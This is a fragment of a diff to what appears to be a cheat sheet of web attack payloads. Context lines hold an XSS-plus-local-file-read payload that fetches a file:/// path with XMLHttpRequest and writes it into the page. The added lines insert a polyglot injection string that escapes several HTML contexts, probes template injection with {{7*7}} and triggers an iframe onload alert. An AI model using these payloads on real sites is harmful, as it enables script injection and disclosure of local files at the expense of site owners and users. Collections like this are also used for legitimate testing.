@@ -80,3 +80,7 @@ javascript:(function(){var scripts=document.getElementsByTagName("script"),regex
 ```js
 xss + lfi <script>x = new XMLHttpRequest(); x.open('GET', 'file:///daab2a45fd5c44bca7b6_unzip/index.js', false); x.send(); document.write('<pre>' + x.responseText + '</pre>');</script>
 ```
+---
+```js
+'"/test/></title/</script/</style/-->{{7*7}}<iframe/onload='alert``'<!--
+```
